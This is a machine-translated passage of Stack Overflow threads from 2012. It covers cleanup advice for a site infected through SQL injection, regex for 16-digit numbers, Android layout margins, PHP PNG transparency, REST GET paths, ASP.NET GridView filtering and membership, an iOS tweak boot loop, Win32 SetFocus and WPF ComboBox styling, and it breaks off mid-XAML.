阅读[您网站的 Chrome 恶意软件诊断](http://safebrowsing.clients.google.com/safebrowsing/diagnostic?site=http%3A%2F%2Fpalacechemicals.co.uk%2F&client=googlechrome&hl=en-US)。如果您单击诊断中指向[AS15418 (FASTHOSTS)](http://safebrowsing.clients.google.com/safebrowsing/diagnostic?site=AS:15418&client=googlechrome&hl=en-US)的链接，则会显示托管服务有很多站点被感染：

> ***当 Google 访问托管在此网络上的网站时发生了什么？***
> 
>  *> 在过去 90 天内我们在此网络上测试的 45254 个站点中，有**885 个站点（**包括例如 lalydesign.co.uk/、consolegaming.eu/、nimbiz.com/）提供的内容导致在未经用户同意的情况下下载和安装恶意软件。
> > 
> > Google 上一次在该网络上测试网站是在 2012 年 4 月 23 日，最后一次发现可疑内容是在 2012 年 4 月 23 日。* 
> 
> ...
> 
> **该网络是否托管了散布恶意软件的站点？**
> 
> > *是的，该网络托管的网站在过去 90 天内分发了恶意软件。我们发现**35 个站点（**例如 hipsxpress.co.uk/、qpscars.co.uk/、aroundbritain.co.uk/）感染了**58 个其他站点**，例如 meb。 gov.tr/、opes.go.th/、stephenbrowning.co.uk/。*

我的猜测是您应该对他们施加压力（**编辑**）以解决安全问题，或更改托管服务。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-12T09:19:18.493

许多网站已受到此攻击的影响。针对易受攻击的 ASP 站点的网络犯罪分子。

黑客通过利用您站点中的 SQL 注入漏洞在您的站点中注入此代码。

**安全提示：**

*   *分析代码：* 检查您网站中所有页面的源代码。不要简单地搜索脚本，阅读每一行。找到可疑代码并将其删除（确保它不是您的代码）。注意：某些脚本可能会被编码，因此请仔细检查代码。

*   *目录中的文件：*检查托管目录中的任何可疑文件。

*   *修补漏洞：*黑客通过利用 SQLi 漏洞注入此代码。因此，请尝试在您的站点中找到易受攻击的部分并进行修复。如果您不知道如何执行此操作，请聘请安全专家。您也可以使用一些自动 sqli 扫描程序来查找漏洞（但它不是 100% 准确的）。

*   *更改密码：*修补漏洞后，请更改主机、ftp、mysql 的密码。如果您在其他任何地方使用相同的密码，那么也更改它们。

*信息：* 上述注入通常被称为 Nikjju 攻击。详细信息可以在这里找到： [Nikjju Sql Injection attack &malicious domain](http://www.ehackingnews.com/2012/05/skdjuicom-new-domain-for-nikjju-sql.html)。

# c# - 16位数字的基本正则表达式

> ID：10246242
> 
> 赞同：6
> 
> 时间：2012-04-20T12:27:38.807
> 
> 标签：c#, .net, regex, windows

我目前有一个正则表达式，可以从文件中提取一个 16 位数字，例如：

正则表达式：

```
Regex.Match(l, @"\d{16}") 
```

这适用于以下数字：

> 1234567891234567

虽然我怎么能在正则表达式中包含数字，例如：

> 1234 5678 9123 4567

和

> 1234-5678-9123-4567

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:32:31.363

如果所有组的长度始终为 4 位：

```
\b\d{4}[ -]?\d{4}[ -]?\d{4}[ -]?\d{4}\b 
```

确保组之间的分隔符相同：

```
\b\d{4}(| |-)\d{4}\1\d{4}\1\d{4}\b 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:32:56.603

如果总是在一起或四人一组，那么使用单个正则表达式执行此操作的一种方法是：

`Regex.Match(l, @"\d{16}|\d{4}[- ]\d{4}[- ]\d{4}[- ]\d{4}")`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T12:33:08.727

您可以尝试以下方法：

```
^([0-9]{4}[\s-]?){3}([0-9]{4})$ 
```

这应该够了吧。

请注意：这也允许

1234-5678 9123 4567

仅对破折号或仅空格不严格。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T12:52:13.167

这是一个模式，它将获取所有数字并去除破折号或空格。请注意，它还会检查以验证是否只有 16 个数字。忽略选项是为了注释模式，它不会影响匹配处理。

```
string value = "1234-5678-9123-4567";
string pattern = @"
^                   # Beginning of line
(                   # Place into capture groups for 1 match
  (?<Number>\d{4})    # Place into named group capture
  (?:[\s-]?)          # Allow for a space or dash optional
){4}                  # Get 4 groups
(?!\d)                # 17th number, do not match! abort
$                   # End constraint to keep int in 16 digits
";

var result = Regex.Match(value, pattern, RegexOptions.IgnorePatternWhitespace)
                  .Groups["Number"].Captures
                  .OfType<Capture>()
                  .Aggregate (string.Empty, (seed, current) => seed + current);

Console.WriteLine ( result ); // 1234567891234567

// Shows False due to 17 numbers!
Console.WriteLine ( Regex.IsMatch("1234-5678-9123-45678", pattern, RegexOptions.IgnorePatternWhitespace)); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T12:36:08.163

另一种选择是仅使用您当前拥有的正则表达式，并在运行正则表达式之前从字符串中删除所有违规字符：

```
var input = fileValue.Replace("-",string.Empty).Replace(" ",string.Empty);
Regex.Match(input, @"\d{16}"); 
```

# android - 在 ImageView 上设置负边距会移动 ImageView 但不是 Image

> ID：10246246
> 
> 赞同：6
> 
> 时间：2012-04-20T12:28:02.297
> 
> 标签：android, layout, imageview

我需要将作为 LinearLayout 的直接子级的 ImageView 向左移动一点。

会发生什么：视图被移动（可以看到“边界框”被移动，使用 android 布局管理器）但可绘制对象保持在同一个位置。

如果我将边距设置得足够低，drawable 也会在右侧切割。

![在此处输入图像描述](../Images/282e020eab0eaa7fe6145b0efbb8be05.png)

为什么是这样？有什么建议吗？

*   澄清：我必须将图像向左移动。这意味着有点超出了包含布局的范围。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-23T21:14:34.717

似乎元素总是在超出父级边界时被裁剪（也使用 clipChildren=false）。

一种解决方案是为要移动的项目之外的所有内容创建一个额外的容器布局。然后将容器布局向相反方向移动。

例如，要移动 -10dip：

```
<Original container ...>
    <Item to be shifted/>
    <New container with margin 10dip>
         <Previous content of Original container ... />
    </New container with margin 10dip>
</Original container> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-17T15:20:23.877

如果您的容器有足够的填充，您可以将其**clipToPadding**设置为**false**并使用负边距！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T12:34:09.557

你为什么使用负边距？在 ImageView 的另一侧向要移动图像的方向多使用一点正值，即如果要将图像向左移动，请在右侧使用更多的正边距。

# php - 在 PHP 中替换透明颜色

> ID：10246249
> 
> 赞同：5
> 
> 时间：2012-04-20T12:28:19.383
> 
> 标签：php, png, gd, alpha-transparency

我有一组图像。在此图像中存在绿色 alpha 颜色。我需要将透明颜色替换为另一种颜色（我想替换为白色 alpha 颜色）。

它是我的代码：

```
$img = imagecreatefrompng($path . $file); 
$white_color_transparent = imagecolorallocatealpha($img, 255, 255, 255, 127);
for ($y = 0; $y < imagesy($img); $y++) {
    for ($x = 0; $x < imagesx($img); $x++) {
        $rgb = imagecolorat($img, $x, $y);
        $pixel_color = imagecolorsforindex($img, $rgb);
        if ($pixel_color['alpha'] != 0 && $pixel_color['alpha'] != 127){
            imagesetpixel($img, $x, $y, $white_color_transparent);
        }
    }
}

imagealphablending($img, false);
imagesavealpha($img, true);            
imagepng($img, $path .  $file); 
```

当我之前添加时，我的结果颜色与 id 源图像相同

```
imagesetpixel($img, $x, $y, $white_color_transparent); 
```

那行：

```
imagesetpixel($img, $x, $y, $white_color); 
```

我只得到没有透明度的白色。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-25T18:18:15.293

没有看到您的图像，我不确定是否有一种简单的方法可以做到这一点。

**编辑2：**

我从第一次编辑中注意到的一件事是，它不适用于具有透明度且后面没有不透明层的图像。

这是我尝试处理具有一定透明度的图像。正如您在示例中看到的那样。结果并不完美。

```
<?php
//These colors here are the rgba values of the green transparency I used in my test image. You will need to know this to reverse the rgb blending.
$red = 28;
$green = 198;
$blue = 72;
$alpha = .48;

$img = imagecreatefrompng('test.png');

//Adding in the image blending that Zombaya brought up. Need this so it overwrites the pixel instead of blending it
imagealphablending($img, false);
for ($y = 0; $y < imagesy($img); $y++) {
    for ($x = 0; $x < imagesx($img); $x++) {
        $rgb = imagecolorat($img, $x, $y);
        $pixel_color = imagecolorsforindex($img, $rgb);

        //If pixel color matches our alpha layer color, we change it white transparent
        //Not sure how accurate the rounding for the alpha conversion is. Maybe the reason for the green edges in this example:
        if($pixel_color['red'] == $red && 
            $pixel_color['green'] == $green &&
            $pixel_color['blue'] == $blue &&
            $pixel_color['alpha'] == round(127 - ($alpha * 127))){
            $color = imagecolorallocatealpha($img, 255, 255, 255, 127);
        } else {
            //This is the algorithm from the link. But reordered to get the old color before the transparent color went over it.
            $oldR = ($pixel_color['red'] - $alpha * $red) /  (1 - $alpha);
            $oldG = ($pixel_color['green'] - $alpha * $green ) / (1 - $alpha);
            $oldB = ($pixel_color['blue'] - $alpha * $blue) / (1 - $alpha);

            $color = imagecolorallocatealpha($img, $oldR, $oldG, $oldB, $pixel_color['alpha']);
        }
        imagesetpixel($img, $x, $y, $color);
    }
}
imagesavealpha($img, true);            
imagepng($img, 'test_result.png'); 
```

![在此处输入图像描述](../Images/1ade2bc48b1d0248806799b4f9b31514.png)-> 没有透明度的原始

![在此处输入图像描述](../Images/047ee3665f9485d28965e39022163bad.png)-> 具有透明度的起始图像

![在此处输入图像描述](../Images/ce348896e06eeb14d0b7e27ad24d0fed.png)-> 生成的图像。注意绿色边缘。我可能很幸运对红色和绿色使用了类似的不透明度。白色部分是透明的

**编辑：**

我想了更多，我发现了这个链接：[如何通过指定 alpha 混合量来计算 RGB 颜色？](https://stackoverflow.com/questions/746899/how-to-calculate-an-rgb-colour-by-specifying-an-alpha-blending-amount)

这有助于我了解如何解决您的问题。尽管这取决于您是否只有在图像上透明的纯色。如果是渐变，那就更难了。

```
<?php
//These colors here are the rgba values of the green transparency I used in my test image. You will need to know this to reverse the rgb blending.
$red = 44;
$green = 215;
$blue = 56;
$alpha = .45;

$img = imagecreatefrompng('test2.png');

for ($y = 0; $y < imagesy($img); $y++) {
    for ($x = 0; $x < imagesx($img); $x++) {
        $rgb = imagecolorat($img, $x, $y);
        $pixel_color = imagecolorsforindex($img, $rgb);
            //This is the algorithm from the link. But reordered to get the old color before the transparent color went over it.
        $oldR = ($pixel_color['red'] - $alpha * $red) /  (1 - $alpha);
        $oldG = ($pixel_color['green'] - $alpha * $green ) / (1 - $alpha);
        $oldB = ($pixel_color['blue'] - $alpha * $blue) / (1 - $alpha);

        $color = imagecolorallocate($img, $oldR, $oldG, $oldB);
        imagesetpixel($img, $x, $y, $color);
    }
}
imagesavealpha($img, true);            
imagepng($img, 'test_result.png'); 
```

![在此处输入图像描述](../Images/1c4e4246df277d327b6dbed9270e6800.png)- 起始图像

![在此处输入图像描述](../Images/a60535600acb262995b059874c2d9262.png)- 后像

这是上面代码中使用的 rgb 计算的解释。该链接显示了基本公式：

```
out = alpha * new + (1 - alpha) * old 
```

`out`是将原始颜色与新颜色混合后的结果颜色。

所以我们需要重新排列公式以获得旧颜色，从而产生：

```
old = (out - alpha * new) / (1 - alpha) 
```

**旧答案：**

为什么这条线不起作用：

```
$white_color_transparent = imagecolorallocatealpha($img, 255, 255, 255, 127); 
```

127 表示完全透明，也就是说它是不可见的。这就是为什么结果图像与起始图像相同的原因。

为什么这条线会创建一个全白的图像：

```
$white_color = imagecolorallocatealpha($img, 255, 255, 255, 0); 
```

或者

```
$white_color = imagecolorallocate($img, 255, 255, 255); 
```

这基本上只是在所选像素上放置一个白色像素（0 表示没有透明度），这就是所选像素变为全白的原因。

现在，如果您执行以下操作：

```
$white_color_semi_transparent = imagecolorallocatealpha($img, 255, 255, 255, 40); 
```

与其用透明的白色代替透明的绿色，不如用更浅的绿色代替半透明的白色。

请参阅我的测试示例：

![起始图像](../Images/8a4ff6ea2bf88af18753f6cd3f4de6fe.png)- 起始图像

![在此处输入图像描述](../Images/157e50845a506996f7fd7c52448efffe.png)- 生成颜色为 255,255,255,40 的图像

所以这告诉我们两件事：

1.  首先是颜色基本上应用在现有像素的颜色之上，因此更浅的透明绿色而不是透明的白色。
2.  其次，注意棕色部分不受影响。棕色部分实际上是绿色不透明层下方的不透明红色。这说明图像没有考虑像 Photoshop 这样的图层，基本上将棕色读取为棕色，而不是绿色透明色后面的红色。这是有道理的，因为 PNG 文件不附带图层信息。

我不确定你会如何解决你的问题。这将取决于你的形象。我认为可以得到你想要的颜色，但显然你的图像越复杂就越难。例如，我的两个重叠的正方形有两种颜色，而不是一张照片。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T20:49:30.663

我使用 Gohn67 的图像作为工作宽度。

诀窍是在尝试转换图像之前关闭 alpha 混合。这样，您可以使用`imagesetpixel()`将像素设置为您想要的确切值。

从手册上看[`imagealphablending`](http://php.net/manual/en/function.imagealphablending.php)：

> 在非混合模式下，绘图颜色将使用其 Alpha 通道信息逐字复制，替换目标像素。

这导致了以下代码：

```
$img = imagecreatefrompng($path.$file);
imagealphablending($img, false); // Turn off blending
$white_color_transparent = imagecolorallocatealpha($img, 255, 255, 255, 127);
for ($y = 0; $y < imagesy($img); $y++) {
    for ($x = 0; $x < imagesx($img); $x++) {
        $rgb = imagecolorat($img, $x, $y);
        $pixel_color = imagecolorsforindex($img, $rgb);
        if ($pixel_color['alpha'] != 0 && $pixel_color['alpha'] != 127){
            imagesetpixel($img, $x, $y, $white_color_transparent);
        }
    }
}
imagesavealpha($img, true);            
imagepng($img, $path.$file); 
```

## 原始图像

![原始图像](../Images/e6301535637ab4cb3c20f91db28a6cf3.png)

## 生成的图像

![结果图像](../Images/3acb1bb25bf582dee454fb9b4f993a77.png)
*（背景其实是透明的，但是这里看不到）*

我想说的是，它现在用这种完全透明的白色代替了所有透明的颜色。如果您希望将所有彩色透明度替换为具有相同 alpha 值的透明白色，您可以执行以下操作：

```
imagesetpixel($img, $x, $y, imagecolorallocatealpha($img, 255, 255, 255, $pixel_color['alpha'])); 
```

为了只选择绿色透明像素，我会计算每个像素的色调并检查它是否在指定范围内。

# http - 拥有多个 Get in Restful webservice

> ID：10246254
> 
> 赞同：0
> 
> 时间：2012-04-20T12:28:47.577
> 
> 标签：http, rest, get

我正在开发一个项目来连接测试仪器并使用 web 服务从它获取请求和响应。

我必须从仪器请求多个服务，但是当我`@Get`在服务器中使用两个以上的 s 时，我的浏览器中出现错误提示

> 无法访问WADL，请重启你的restful webservice

这是我的代码，

```
GET 
@Produces("text/html") 
public String getHtml(){ 
   String ins_name=null; 

   try { 
      String [] env=null; 
      //setting the environment variable. 
      String[]callAndArgs= {"python","instrument_name.py"};//Python and file name 

      Process p = Runtime.getRuntime().exec(callAndArgs,env, 
         new java.io.File("C:\\fakepath\\NetBeansProjects\\DemoApp1\\build\\web"));//executing Python file 

      BufferedReader stdInput = new BufferedReader(new   
      InputStreamReader(p.getInputStream()));//getting the value from Python file    
      BufferedReader stdError = new BufferedReader(new     
      InputStreamReader(p.getErrorStream()));// reading the error     
      ins_name = stdInput.readLine();//reading the output from the Pythonfile     
      System.out.println(ins_name); 
   } 
   catch (IOException e) {//catching the exception 

      System.out.println("exception occured"); 
      e.printStackTrace(); 
      System.exit(-1); 
   } 

   return ins_name;//returning the instrument name 
} 

@GET 
@Produces("text/html") 
public String getHtml1() { 
   String check=null; 
   String c1="hjhj"; 
   String [] env=null; 
   //setting the environment variable. 
   try{ 
      String[] callAndArgs= {"python","check_connection.py",c1};//Python and file name 

      Process p = Runtime.getRuntime().exec(callAndArgs,env, 
      new java.io.File("C:\\Users\\Balkishore\\Documents\\NetBeansProjects\\DemoApp1\\build\\web"));//executing Python file 

      BufferedReader stdInput = new BufferedReader(new 
      InputStreamReader(p.getInputStream()));//getting the value from Python file 

      BufferedReader stdError = new BufferedReader(new 
         InputStreamReader(p.getErrorStream()));// reading the error 

      check= stdInput.readLine();//reading the output from the Python file 
      System.out.println(); 
   } 
   catch (IOException e) {//catching the exception 

      System.out.println("exception occured"); 
      e.printStackTrace(); 
      System.exit(-1); 
   } 
   return check; 
} 

/** 
* Web service operation 

} 

/** 
* PUT method for updating or creating an instance of GenericResource 
* @param content representation for the resource 
* @return an HTTP response with content of the updated or created resource. 
*/ 
@PUT 
@Consumes("text/html") 
public String putHtml(String interface_name) { 

   try { 
      String [] env=null; 
      String [] callAndArgs= {"python","connection.py",this.interface_name=interface_name};//Python file with arguments 

      Process p = Runtime.getRuntime().exec(callAndArgs,env, 
         new java.io.File("C:\\fakepath\\NetBeansProjects\\DemoApp1\\build\\web"));//executing the Python file 

      BufferedReader stdInput = new BufferedReader(new  
         InputStreamReader(p.getInputStream()));//getting the input 

      BufferedReader stdError = new BufferedReader(new 
         InputStreamReader(p.getErrorStream()));//getting the error 

      interface_name = stdInput.readLine();//reading the output 
      System.out.println(interface_name); 
   } 
   catch (IOException e) {//catching the exception  
      System.out.println("exception occured"); 
      e.printStackTrace(); 
      System.exit(-1); 

   } 
   return interface_name; 
} 
} 
```

我还附上了错误消息的图像。

![错误信息](../Images/b8cdd4f4d725341a1b333c0aadac8a8f.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:33:34.700

除了资源路径之外，除非您为方法 @Path("/mypath") 指定不同的路径，否则不能为资源定义不同的“GET”

```
@Path("/myRes")
public class myResource{

   @GET @Path("/myAttr")
   public void getAttr(...)
} 
```

# c# - 根据 GridView 之外的 Checkbox 过滤 GridView 数据？

> ID：10246255
> 
> 赞同：1
> 
> 时间：2012-04-20T12:28:56.697
> 
> 标签：c#, asp.net, gridview

我的页面上有 5 个复选框和一个带有模板字段的网格视图，我没有在页面加载时使用任何绑定字段我正在将网格与表的所有数据绑定，我想根据复选框过滤数据.

假设：我有像 ABC D 这样的复选框。所有复选框都在网格视图之外。当用户选中复选框 A 时，然后在网格视图中，应显示复选框 A 相关数据，就像 BC 和 D 一样。

怎么做？，有人请给出一些示例代码和位逻辑。

如果我能够在没有任何回发的情况下过滤 gridview，那就太好了。

网格：

```
 <asp:GridView ID="GridView1" runat="server" 
                AutoGenerateColumns="False" CellPadding="3">
      <Columns>
          <asp:TemplateField HeaderText="ID" SortExpression="ID">
            <ItemTemplate>
              <asp:Label ID="lblId" runat="server" Text='<%#Eval("Id") %>'></asp:Label>
           </ItemTemplate>                           
         </asp:TemplateField>
         <asp:TemplateField HeaderText="Discription" SortExpression="Discription">
            <ItemTemplate>
              <asp:Label ID="lblDiscription" runat="server" Text='<%#Eval("Discription") %>'></asp:Label>
            </ItemTemplate>                        
         </asp:TemplateField>
         <asp:TemplateField HeaderText="Address" SortExpression="Address">
            <ItemTemplate>
             <asp:Label ID="lblAddress" runat="server" Text='<%#Eval("Address") %>'></asp:Label>
            </ItemTemplate>
         </asp:TemplateField>
     </Columns>
 </asp:GridView> 
```

绑定网格：

```
TestPageDao page1Dao = new TestPageDao ();

if (!IsPostBack)
{
  IList<TestDAO> TestDAO = page1Dao.GetAlldata();
  GridView1.DataSource = TestDAO;
  GridView1.DataBind();
} 
```

我试过[Filter gridview](https://stackoverflow.com/questions/2739778/filter-gridview)或[http://forums.asp.net/p/1034014/2904713.aspx](http://forums.asp.net/p/1034014/2904713.aspx)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:44:52.370

如果您想避免回发，请使用 jQuery，如下所示：http: [//jquerybyexample.blogspot.com/2012/04/how-to-filter-gridview-records-using.html](http://jquerybyexample.blogspot.com/2012/04/how-to-filter-gridview-records-using.html)

另一种方法是 AJAX，但在故事的最后，它是一种类似回发的方法。

最后使用回发，您可以通过在加载GridView**之前动态设置 GridView 过滤器来以多种方式完成此操作。**这可以通过页面加载事件、关联数据源的 OnSelecting（如果有）或类似事件来实现。

这是aspx的提取：

```
<asp:CheckBox ID="CheckBox1" runat="server" Text="A" />
<asp:CheckBox ID="CheckBox2" runat="server" Text="B" />
<asp:CheckBox ID="CheckBox3" runat="server" Text="C" />
<asp:CheckBox ID="CheckBox4" runat="server" Text="D" />
<hr />

<asp:GridView ID="GridView1" runat="server" AllowPaging="True" 
    DataSourceID="sqlDataSourceGridView" AutoGenerateColumns="False"
    CssClass="GridViewStyle" GridLines="None" Width="650px" >
    <Columns> 
        <asp:BoundField DataField="CompanyName" HeaderText="Company" ItemStyle-Width="200px" />
        <asp:BoundField DataField="ContactName" HeaderText="Name" ItemStyle-Width="125px"/>
        <asp:BoundField DataField="City" HeaderText="city" ItemStyle-Width="125px" />
        <asp:BoundField DataField="Country" HeaderText="Country" ItemStyle-Width="125px" />
    </Columns>
</asp:GridView>

<asp:SqlDataSource ID="SqlDataSourceGridView" runat="server" 
    ConnectionString="<%$ ConnectionStrings:northWindConnectionString %>" 
    SelectCommand="SELECT [CustomerID], [CompanyName], [ContactName], [City], [Country] FROM [Customers]" 
    OnSelecting="SqlDataSourceGridView_Selecting">
 <FilterParameters>
    <asp:ControlParameter ControlID="checkbox1" Name="CompanyName" PropertyName="Checked" ConvertEmptyStringToNull="false" />
 </FilterParameters>
</asp:SqlDataSource> 
```

注意 OnSelecting 事件并注意没有任何过滤器预设。

现在在后面的代码中动态设置过滤器：

```
protected void SqlDataSourceGridView_Selecting(object sender, SqlDataSourceSelectingEventArgs e) {
    SqlDataSourceGridView.FilterExpression = string.Empty;
    if (CheckBox1.Checked) {
        SqlDataSourceGridView.FilterExpression += "(CompanyName=1)";
    }
    if (CheckBox2.Checked) {
        if (!string.IsNullOrEmpty(SqlDataSourceGridView.FilterExpression)) SqlDataSourceGridView.FilterExpression += " OR ";
        SqlDataSourceGridView.FilterExpression += "(B=1)";
    }
    if (CheckBox3.Checked) {
        if (!string.IsNullOrEmpty(SqlDataSourceGridView.FilterExpression)) SqlDataSourceGridView.FilterExpression += " OR ";
        SqlDataSourceGridView.FilterExpression += "(C=1)";
    }
    if (CheckBox4.Checked) {
        if (!string.IsNullOrEmpty(SqlDataSourceGridView.FilterExpression)) SqlDataSourceGridView.FilterExpression += " OR ";
        SqlDataSourceGridView.FilterExpression += "(D=1)";
    }
} 
```

如果你不喜欢 OnSelecting 事件，你可以在 PageLoad 中做同样的事情：

```
protected void Page_Load(object sender, EventArgs e) {
    // here same code of above
    // . . .
} 
```

我没有测试它，所以验证小错误。

# ios - 卸载调整后 iphone 进入无限循环

> ID：10246257
> 
> 赞同：0
> 
> 时间：2012-04-20T12:29:04.737
> 
> 标签：ios, cydia, tweak

我写了一个名为 Dual Time 的调整，它在锁定屏幕上显示第二个时钟。一切正常，但在卸载调整后在一部手机（iPhone 4）上出现问题，手机进入无限重启循环。硬重置后，手机启动了，但是 Cydia 图标消失了，一些应用程序无法打开。手机的主人必须将电池烧到零，然后才能将手机放入 DFU 并恢复固件。在我的 3GS 上，我无法重现该错误，在相同的 iPhone 4 错误上重新安装和卸载调整后也没有出现。有人知道为什么会这样吗？我的调整有问题吗？Tweek 位于[http://appstudio.org/apt](http://appstudio.org/apt)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-23T10:06:52.427

我也遇到过这个问题，我已经使用以下步骤解决了这个问题：

1.  将您的设备置于恢复（不是 dfu）并等待一段时间。之后同时按下电源和主页按钮，直到手机关闭，然后松开电源按钮并等待几秒钟。

2.  您必须使用您保存的 shsh 进行构建自定义 ipsw 签名（您可以在 google 上搜索），然后程序会要求您将设备放入 pwned dfu。

3.  运行小雨伞并启动服务器以避免问题（3194 ..etc

4.  现在运行 iTunes 并使用签名的 ipsw（不是原始 ipsw）恢复您的 iphone

# jqgrid - 对有限数量的列启用排序

> ID：10246259
> 
> 赞同：0
> 
> 时间：2012-04-20T12:29:11.160
> 
> 标签：jqgrid

在一个有 5 列的网格中，我希望只能对第 2 列和第 4 列进行排序。实现这个的正确方法是什么？- 将第 2 列和第 4 列的 sortable 声明为 true - 还有什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:42:40.497

`sortable`属性的默认值已经是`true`（见这里）。所以你必须包括

```
sortable: false 
```

除了第 2 列和第 4 列之外的所有列的定义中的属性。`colModel`如果您有很多列，那么最好更改`colModel`项目的默认值：

```
cmTemplate: { sortable: false } 
```

之后，您应该包含`sortable: true`在第 2 列和第 4 列中。您可以更改任何其他默认值`colModel`。有关更多详细信息，请参阅[答案](https://stackoverflow.com/a/6047856/315935)。

# c# - 更新aspnet会员密码答案

> ID：10246271
> 
> 赞同：0
> 
> 时间：2012-04-20T12:29:59.540
> 
> 标签：c#, asp.net, security, hash, asp.net-membership

我将在 aspnet_Membership 中更新安全问题和答案。通常它是通过代码完成的：

```
 user.ChangePasswordQuestionAndAnswer(password, question, answer); 
```

但我不知道密码。我发现有一个默认的存储过程。存储过程是：

```
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER OFF
GO
ALTER PROCEDURE [dbo].[aspnet_Membership_ChangePasswordQuestionAndAnswer]
    @ApplicationName       nvarchar(256),
    @UserName              nvarchar(256),
    @NewPasswordQuestion   nvarchar(256),
    @NewPasswordAnswer     nvarchar(128)
AS
BEGIN
   DECLARE @UserId uniqueidentifier
   SELECT  @UserId = NULL
   SELECT  @UserId = u.UserId
   FROM    dbo.aspnet_Membership m, dbo.aspnet_Users u, dbo.aspnet_Applications a
   WHERE   LoweredUserName = LOWER(@UserName) AND
        u.ApplicationId = a.ApplicationId  AND
        LOWER(@ApplicationName) = a.LoweredApplicationName AND
        u.UserId = m.UserId
   IF (@UserId IS NULL)
   BEGIN
      RETURN(1)
   END

   UPDATE dbo.aspnet_Membership
     SET    PasswordQuestion = @NewPasswordQuestion, PasswordAnswer = @NewPasswordAnswer
    WHERE  UserId=@UserId
   RETURN(0)
   END 
```

但是我刚刚发现答案是明文。如何使用存储过程并对其进行散列？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T14:04:25.793

如果您有权访问该用户，则可以在使用 Membership 方法之前更改其密码：

```
public virtual bool ChangePassword(string oldPassword, string newPassword) 
```

你可以试试

```
string newPassword = user.ResetPassword();
user.ChangePassword(newPassword, "SOMENEWPASSWORD"); 
```

然后做

```
user.ChangePasswordQuestionAndAnswer("SOMENEWPASSWORD", question, answer); 
```

# c# - User32.DLL SetFocus 失败并出现 Win32 错误 5：访问被拒绝

> ID：10246276
> 
> 赞同：1
> 
> 时间：2012-04-20T12:30:25.093
> 
> 标签：c#, pinvoke, access-denied, user32

下面的代码执行以下操作

PushWindowToFront():

*   获取当前进程 id 供以后参考
*   使用回调**EnumWindowsCallback**方法调用 user32.dll 函数**EnumWindows**
***   EnumWindows 然后遍历每个窗口并为每个窗口调用回调**

 **打回来：

*   检查窗口线程进程id是否与当前进程id相同
*   如果是，请检查窗口文本是否开始“选择”
*   如果是这样，在窗口句柄上调用 user32.dll 函数 SetFocus
*   检查并打印最后一个 win32 错误

但是，它总是返回 win32 错误 5 - “访问被拒绝”。为什么应用程序无权针对属于同一进程的窗口调用此函数？

.

```
 public void PushWindowToFront()
    {
        currentProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;

        Win32Methods.EnumWindowsCallbackDelegate callback = new Win32Methods.EnumWindowsCallbackDelegate(this.EnumWindowsCallback);

        Win32Methods.EnumWindows(callback, (IntPtr) 0);
    }

    public bool EnumWindowsCallback(IntPtr hWnd, IntPtr lParam)
    {
        uint i = 0;

        Win32Methods.GetWindowThreadProcessId(hWnd, out i);

        if (currentProcessId == i)
        {

            StringBuilder sb = new StringBuilder(512);

            Win32Methods.GetWindowText(hWnd, sb, sb.Capacity);

            if (sb.ToString().Split(' ')[0].ToLower().Equals("select"))
            {
                IntPtr result = Win32Methods.SetFocus(hWnd);
                Console.WriteLine("Window found: {0}\r\nSetting focus...\r\nResult: {1}\r\nLastError: {2}",
                    sb.ToString(), result, Marshal.GetLastWin32Error().ToString());
            }
        }

        return true;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-01T17:48:36.093

我收到了这个确切的情况；我的理解是“SetFocus”是罪魁祸首。我通过用“SetForegroundWindow”替换“SetFocus”解决了这个错误

```
hwnd = win32gui.FindWindow(None, winName)
win32gui.SetForegroundWindow(hwnd) 
```**

# wpf - Wpf ComboBox 样式触发器和绑定

> ID：10246285
> 
> 赞同：0
> 
> 时间：2012-04-20T12:31:05.047
> 
> 标签：wpf

我正在创建一个可以通过遥控器或键盘控制的 wpf 应用程序。我正在尝试创建一个组合框，当焦点移到它时，文本会发光。通过单击遥控器上的确定（或在键盘上输入），将出现下拉菜单，允许用户做出选择。为了使键盘导航工作，我创建了一个扩展组合框的自定义控件。一切正常，但我在设计它时遇到了麻烦。我希望 ComboBox 成为具有上述发光效果的文本框，但我无法确定触发器的放置位置。在下面的 Xaml 中，我收到一个错误，即找不到“FlowMenuComboBoxContentTemplateGlow”。我也无法确定我需要在文本框中绑定什么以显示所选项目的文本。任何人都可以帮忙吗？谢谢

```
<!--Flow Menu Text-->
<Style x:Key="FlowMenuText"
       TargetType="TextBlock">
    <Setter Property="Foreground"
            Value="LightGray" />
    <Setter Property="FontFamily"
            Value="Segoe UI Light, Lucida Sans Unicode, Verdana" />
    <Setter Property="FontSize"
            Value="24" />
    <Setter Property="TextOptions.TextHintingMode"
            Value="Animated" />
</Style>
<!--Flow Menu KN ComboBox ContentTemplate-->
<DataTemplate x:Key="FlowMenuComboBoxContentTemplate">
    <TextBlock Text="WHAT SHOULD I BIND TO?" Style="{DynamicResource FlowMenuText}">
        <TextBlock.Effect>
            <DropShadowEffect x:Name="FlowMenuComboBoxContentTemplateGlow" BlurRadius="8" Color="LightGray" ShadowDepth="0" Opacity="0" />
        </TextBlock.Effect>
    </TextBlock>
</DataTemplate>
<!--Flow Menu KNComboBox-->
<Style x:Key="FlowMenuComboBox"
       TargetType="ComboBox">
    <Setter Property="BorderBrush"
            Value="{x:Null}" />
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type ComboBox}">
                <Grid x:Name="MainGrid" SnapsToDevicePixels="true">
